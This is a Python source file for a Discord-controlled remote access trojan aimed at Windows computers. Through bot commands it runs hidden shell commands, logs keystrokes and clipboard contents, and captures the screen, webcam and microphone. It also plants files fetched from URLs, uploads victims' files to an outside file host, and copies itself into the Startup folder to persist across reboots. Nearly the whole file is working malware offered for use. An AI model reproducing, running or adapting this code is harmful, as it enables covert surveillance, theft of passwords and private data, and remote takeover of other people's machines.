import os, datetime, pyautogui, subprocess, requests, cv2, zipfile, asyncio, platform, sys, shutil, pyaudio, wave
import discord, io, aiohttp

from Clip_logging import Cliplogger
from Key_logging import Keylogger
from urllib.parse import urlparse
from discord.ext import commands

TOKEN = 'TOKENHERE'
BANNED_EXTENSIONS = {'.html', '.htm', '.exe', '.scr', '.cpl', '.doc', '.docx', '.jar'}

intent = discord.Intents.all()
intent.message_content = True

bot = commands.Bot(command_prefix=".", intents=intent)
klogger = Keylogger()
clogger = Cliplogger()
prefix = '.'

def get_current_userAndMachine():
    user = os.getlogin()
    machine = platform.node()
    return user, machine

async def who(ctx: commands.Context):
    user, machine = get_current_userAndMachine()
    await ctx.send(f"**current user:**\n```\n{user}\n```**current machine:**\n```\n{machine}\n```")

async def hello(ctx: commands.Context):
    await ctx.send(f"hello, welcome! {ctx.author.mention}")

async def cliplog_start(ctx: commands.Context):
    await ctx.send("starting cliplogger..")
    clogger.start_cliplog()
    await ctx.send("cliplogger started!")

async def cliplog_read(ctx: commands.Context):
    output = clogger.wrap_read_cliplog()
    await ctx.send(f"**cliplogger dump:**\n```\n{output}\n```")

async def cliplog_stop(ctx: commands.Context):
    await ctx.send("stopping cliplogger..")
    clogger.stop_cliplog()
    await ctx.send("cliplogger stopped!")

async def keylog_start(ctx: commands.Context):
    await ctx.send("starting keylogger..")
    klogger.start_log()
    await ctx.send("keylogger started!")

async def keylog_read(ctx: commands.Context):
    data = klogger.baca_log()
    await ctx.send(f"**keylogger dump:**\n```\n{data}\n```")

async def keylog_stop(ctx: commands.Context):
    await ctx.send("stopping keylogger..")
    klogger.stop_listener()
    await ctx.send("keylogger stopped!")

async def upload(ctx: commands.Context, url=None, local_file=None):
    try:
        if not local_file:
            parsed = urlparse(url)
            local_file = os.path.basename(parsed.path)

            if not local_file:
                local_file = "WUFDGZ.html"
        
        await ctx.send(f"connecting to '{url}'")

        with requests.get(url, stream=True, timeout=30) as res:
            res.raise_for_status()
            with open(local_file, 'wb') as file:
                for chunk in res.iter_content(chunk_size=8192):
                    if chunk:
                        file.write(chunk)

        await ctx.send(f"**file is successfully uploaded!**\n```\n{local_file}\n```")
    
    except requests.exceptions.HTTPError as e:
        await ctx.send(f"the server responded with status code: {res.status_code}\n```detail:\n{e}\n```")
    except requests.exceptions.ConnectionError as e:
        await ctx.send(f"can't connect to server ```detail:\n{e}\n```")
    except requests.exceptions.Timeout as e:
        await ctx.send("connection timed out by 30sec")
    except requests.exceptions.RequestException as e:
        await ctx.send(f"unknown error has occured ```detail:\n{e}\n```")
    except PermissionError:
        await ctx.send(f"you have no permission to write '{local_file}' file")
    except OSError as e:
        await ctx.send(f"{e}")
    except Exception as e:
        await ctx.send(f"{e}")

async def download(ctx: commands.Context, file:str, time:str="24h"):
    if not os.path.exists(file):
        await ctx.send("file not found")
        return

    url = "https://litterbox.catbox.moe/resources/internals/api.php"

    file_dir = os.path.dirname(file)
    base_name = os.path.basename(file)
    name, ext = os.path.splitext(base_name)

    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    }

    result = await ctx.send("processing file..")

    try:
        timeout = aiohttp.ClientTimeout(total=30)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            if ext.lower() in BANNED_EXTENSIONS:
                zipname = f"{name}_{timestamp}.zip"
                zippath = os.path.join(file_dir, zipname) if file_dir else zipname

                await ctx.send("bad extension detected, zipping it..")

                with zipfile.ZipFile(zippath, 'w', zipfile.ZIP_DEFLATED) as z:
                    z.write(file, base_name)
                
                await ctx.send("sending zipped file..")
                
                payload = aiohttp.FormData()
                payload.add_field('reqtype', 'fileupload')

                if time:
                    payload.add_field('time', time)

                with open(zippath, 'rb') as zf:

                    payload.add_field('fileToUpload', zf, filename=zipname, content_type='application/zip')

                    async with session.post(url, data=payload, headers=headers) as response:
                        response_txt = await response.text()
                        statuscode = response.status
                            
                if os.path.exists(zippath):
                    os.remove(zippath)
            else:
                safename = f"{base_name}"
                await ctx.send(f"downloading.. '{safename}'")

                payload = aiohttp.FormData()
                payload.add_field('reqtype', 'fileupload')

                if time:
                    payload.add_field('time', time)

                with open(safename, 'rb') as f:

                    payload.add_field('fileToUpload', f, filename=safename)

                    async with session.post(url, data=payload, headers=headers) as response:
                        response_txt = await response.text()
                        statuscode = response.status

        if statuscode == 200:
            await ctx.send(f"**file is ready to download!**\n```\n{response_txt}\n```")
        else:
            await ctx.send(f"**failed to turn file into link**```\nstatuscode:\n{statuscode}\n```")
    except Exception as e:
        await ctx.send(f"{e}")

async def size(ctx: commands.Context, file=None):
    try:
        if not file:
            ctx.send("enter a file to calculate their size")
            return
        
        if os.path.exists(file) and os.path.isfile(file):
            filesize = os.path.getsize(file)
            await ctx.send(f"the file size of '{file}' is {str(filesize)} byte")
        else:
            await ctx.send(f"can't get the size of '{file}', file not found")
    except TypeError:
        await ctx.send(f"the path must be string or a byte object")
    except ValueError:
        await ctx.send(f"the path contains invalid characters")
    except OSError as e:
        await ctx.send(f"{e}")

async def exe(ctx: commands.Context,*, cmd: str = None):
    if not cmd:
        return await ctx.send("enter a command you want to run")
    try:
        if ctx.author.id != 1434492547409117264:
            ctx.send("cannot run command, only author")
            return

        DETACHED_PROCESS = 0x00000008
        CREATE_NEW_PROCESS_GROUP = 0x00000200
        CREATE_NO_WINDOW = 0x08000000

        flag = DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP | CREATE_NO_WINDOW

        result = subprocess.Popen(cmd, creationflags=flag, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.DEVNULL)
        stdout, stderr = result.communicate()
        res = stdout if result.returncode == 0 else stderr

        if not res or res.strip() == "":
            return await ctx.send("```[NO OUTPUT]```")

        if len(res) <= 1900:
            prefix = "**TERMINAL OUTPUT:**" if result.returncode == 0 else "**TERMINAL ERROR:**"
            await ctx.send(f"{prefix} ```\n{res}\n```")
        else:
            buffer = io.BytesIO(res.encode())
            buffer.seek(0)
            filename = "output.txt" if result.returncode == 0 else "error.txt"
            await ctx.send(
                content="ouput is too long, see it in this file:",
                file=discord.File(fp=buffer, filename=filename)
            )
    except subprocess.TimeoutExpired:
        await ctx.send(f"**TERMINAL ERROR:** ```program stopped because of timeout 30sec```")
    except Exception as e:
        await ctx.send(f"**TERMINAL ERROR:** ```\n{e}\n```")

async def ls(ctx: commands.Context, *, path: str = '.'):
    def scan(target):
            apath = os.path.abspath(target)
            if not os.path.exists(apath):
                raise FileNotFoundError(f"directory not found '{apath}'")
            
            folders = []
            files = []
            listdir = os.listdir(apath)

            for item in listdir:
                full_path = os.path.join(apath, item)

                if os.path.isdir(full_path):
                    folders.append(f" 📁 {item}")
                else:
                    files.append(f" 📄 {item}")
            
            return apath, folders, files
        
    try:
        loop = asyncio.get_running_loop()
        path, folders, files = await loop.run_in_executor(None, scan, path)

        folder = "\n".join(folders) if folders else "[NO FOLDER HERE]"
        file = "\n".join(files) if files else "[NO FILE HERE]"

        content = (
            f"Content of '{path}':\n\n"
            f"--- FOLDERS ---\n{folder}\n\n"
            f"--- FILES ---\n{file}"
        )

        msg = (
            f"the content of '{path}':\n\n"
            f"**FOLDER:**\n```\n{folder}\n```\n"
            f"**FILE:**\n```\n{file}\n```"
        )

        if len(msg) <= 2000:
            await ctx.send(msg)
        else:
            data = io.StringIO(content)
            file = discord.File(fp=data, filename=f"ls_{os.path.basename(path) or 'root'}.txt")
            await ctx.send(content=f"content of folder '{path}' is too long, sending it to a file", file=file)

    except TypeError:
        await ctx.send(f"the path must be string or a byte object")
    except ValueError:
        await ctx.send(f"the path contains invalid characters")
    except OSError as e:
        await ctx.send(f"{e}")
    except FileNotFoundError as e:
        await ctx.send(f"{e}")
    except Exception as e:
        await ctx.send(f"{e}")

async def screenshot(ctx: commands.Context):
    pyautogui.screenshot("ss.png")
    file = "ss.png"

    if os.path.exists(file):
        await ctx.send(content=f"screenshot from {datetime.datetime.now()}", file=discord.File(file))
        os.remove(file)
    else:
        await ctx.send("can't take a screenshot")

async def snapcam(ctx: commands.Context):
    try:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        cap.release()

        if not ret:
            return

        cv2.imwrite("wcam.jpg", frame)
        await ctx.send(content=f"snapcam from {datetime.datetime.now()}", file=discord.File("wcam.jpg"))
        os.remove("wcam.jpg")
    except Exception as e:
        await ctx.send(f"can't access camera:\n```{e}```")

async def marco(ctx: commands.Context):
    await ctx.send(f"polo! here's the latency: {round(bot.latency*1000)}ms")

async def cd(ctx: commands.Context,*, path: str = None):
    try:
        if path is None:
            await ctx.send(f"current directory ```{os.getcwd()}```")
        else:
            os.chdir(path)
            await ctx.send(f"changed directory to ```{os.getcwd()}```")
    except FileNotFoundError:
        await ctx.send(f"directory '{path}' not found")
    except PermissionError:
        await ctx.send(f"you have no permission to access '{path}' directory")
    except NotADirectoryError:
        await ctx.send(f"This is a file, not a directory")

async def rmv(ctx: commands.Context, file:str=None):
    try:
        if file is None:
            await ctx.send("enter a file you wanna remove")
        else:
            if os.path.exists(file) and os.path.isfile(file):
                os.remove(file)
                await ctx.send(f"file '{file}' has been removed")
            else:
                await ctx.send("file not found")
    except PermissionError:
        await ctx.send(f"you have no permission to remove file '{file}'")
    except (OSError, Exception) as e:
        await ctx.send(f"{e}")

async def recordmic(ctx: commands.Context, time):
    try:
        if time is None or not str(time).isdigit():
            await ctx.send("enter the time and will be recorded in seconds `.recordmic <sec>`")
            return

        time = int(time)

        FORMAT = pyaudio.paInt16
        CHANNEL = 1
        RATE = 44100
        CHUNK = 1024
        frames = []

        audio = pyaudio.PyAudio()
        stream = audio.open(
            format=FORMAT,
            channels=CHANNEL,
            rate=RATE,
            input=True,
            frames_per_buffer=CHUNK
        )
        await ctx.send(f"recording for {str(time)} seconds")
        for i in range(0, int(RATE / CHUNK * time)):
            data = stream.read(CHUNK)
            frames.append(data)
        await ctx.send(f"recording done! writing it..")
        stream.stop_stream()
        stream.close()
        audio.terminate()

        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        name = f"recordmic_{timestamp}.wav"

        wf = wave.open(name, 'wb')
        wf.setnchannels(CHANNEL)
        wf.setsampwidth(audio.get_sample_size(FORMAT))
        wf.setframerate(RATE)
        wf.writeframes(b''.join(frames))
        wf.close()

        await ctx.send(content="**retrieved file is ready to play!**", file=discord.File(name))

        if os.path.exists(name):
            os.remove(name)
    except Exception as e:
        await ctx.send(f"{e}")

async def MakeandJoinGuild(guild):
    bot_user, bot_machine = get_current_userAndMachine()
    formatted_name = f"{bot_user}_{bot_machine}".lower().replace(" ", "-")
    existing_ch = discord.utils.get(guild.text_channels, name=formatted_name)

    if not existing_ch:
        try:
            new_ch = await guild.create_text_channel(formatted_name)
            await new_ch.send("Hello! i'm ON!")
        except discord.Forbidden:
            print("cannot make channel")
    else:
        try:
            await existing_ch.send("I'm ON!")
        except discord.Forbidden:
            print("cannot send messages")

async def CopytoStartUpFolder(ctx: commands.Context):
    ScriptPath = os.path.abspath(sys.executable)
    scriptName = os.path.basename(ScriptPath)
    startupFolderPath = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
    startupFolder = os.path.join(startupFolderPath, scriptName)

    if not os.path.exists(startupFolder):
        try:
            shutil.copy2(ScriptPath, startupFolder)
            await ctx.send("file has been copied to startup folder!")
        except Exception as e:
            await ctx.send(f"**failed to copy file**\n```\nerror:\n{e}\n```")
    else:
        await ctx.send("file is already in startup")

async def help(ctx: commands.Context):
    help = (
        "**commands:**\n"
        "```\n"
        "::GENERAL COMMAND\n"
        ".help      :: shows this message\n"
        ".cd <[folder]> :: change directory\n"
        ".ls [folder] :: list directory\n"
        ".who       :: shows current user and machine\n"
        ".hello     :: to check if bot still on\n"
        ".marco     :: check latency\n"
        ".rmv <file> :: remove file\n"
        ".exe <command> :: execute windows command\n"
        ".size <file> :: calculate file size\n"
        ".addstartup :: add program to startup\n"
        ".recordmic <time> :: record audio and save it\n"
        "\n"
        "::FILE TRANSFER\n"
        ".download <file> [time] :: turns a file into downloadable link\n"
        ".upload <url-with-file> [name] :: request a file from a url and plant it in target machine\n"
        "\n"
        "::LOGGER\n"
        "   ::KEYLOGGING\n"
        "    .keylog_start  :: start keylogger\n"
        "    .keylog_read   :: dumps keylogger\n"
        "    .keylog_stop   :: stops keylogger\n"
        "   ::CLIPLOGGING\n"
        "    .cliplog_start :: start clipboard logger\n"
        "    .cliplog_read  :: dumps clipboard logger\n"
        "    .cliplog_stop  :: stops clipboard logger\n"
        "```"
    )
    await ctx.send(help)

@bot.event
async def on_ready():
    for guild in bot.guilds:
        await MakeandJoinGuild(guild)

@bot.event
async def on_guild_join(guild):
    await MakeandJoinGuild(guild)

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return
    txt = message.content.strip()

    if txt.startswith(prefix):
        part = txt.split(" ")
        command = part[0].lower()
        arg = part[1:]
        
        ctx = await bot.get_context(message)

        if command == '.cd':
            if not arg:
                await cd(ctx)
            else:
                path = " ".join(arg)
                await cd(ctx, path=path)
        elif command == '.ls':
            if not arg:
                await ls(ctx)
            else:
                path = " ".join(arg)
                await ls(ctx, path=path)
        elif command == ".exe":
            if not arg:
                await exe(ctx)
            else:
                cmd = " ".join(arg)
                await exe(ctx, cmd=cmd)
        elif command == ".rmv":
            if not arg:
                await rmv(ctx)
            else:
                file = " ".join(arg)
                await rmv(ctx, file=file)
        elif command == ".size":
            if not arg:
                await size(ctx)
            else:
                file = " ".join(arg)
                await size(ctx, file=file)
        elif command == ".recordmic":
            if not arg:
                await recordmic(ctx)
            else:
                time = " ".join(arg)
                await recordmic(ctx, time=time)

        elif command == ".download":
            if not arg:
                await ctx.send("wrong formatting, should be `.download <file>.<ext>` or `.download <file>.<ext> <time><h/m/d>`")
                return
            LastWord = arg[-1]
            if LastWord.endswith(('h', 'm', 'd')) and any(char.isdigit() for char in LastWord):
                time = LastWord
                FileInput = " ".join(arg[:-1])
            else:
                time = '24h'
                FileInput = " ".join(arg)
            
            if not FileInput:
                await ctx.send("enter a file to turn into a link")
                return
            
            await download(ctx, file=FileInput, time=time)
            return
        elif  command == ".upload":
            UrlInput = None
            fileInput = None

            if arg:
                if arg[0].startswith(("https://", "http://")):
                    UrlInput = arg[0]

                    if len(arg) > 1:
                        fileInput = " ".join(arg[1:])
                else:
                    fileInput = " ".join(arg)
            await upload(ctx, UrlInput, fileInput)
            return
        
        elif command == ".marco":
            await marco(ctx)
        elif command == ".hello":
            await hello(ctx)
        elif command == ".who":
            await who(ctx)

        elif command == ".snapcam":
            await snapcam(ctx)
        elif command == ".screenshot":
            await screenshot(ctx)

        elif command == ".cliplog_start":
            await cliplog_start(ctx)
        elif command == ".cliplog_read":
            await cliplog_read(ctx)
        elif command == ".cliplog_stop":
            await cliplog_stop(ctx)

        elif command == ".keylog_start":
            await keylog_start(ctx)
        elif command == ".keylog_read":
            await keylog_read(ctx)
        elif command == ".keylog_stop":
            await keylog_stop(ctx)

        elif command == ".help":
            await help(ctx)
        elif command == ".addstartup":
            await CopytoStartUpFolder(ctx)

        else:
            await ctx.send(f"unknown command '{command}', type '.help' for help")
            return

bot.run(TOKEN, reconnect=True)
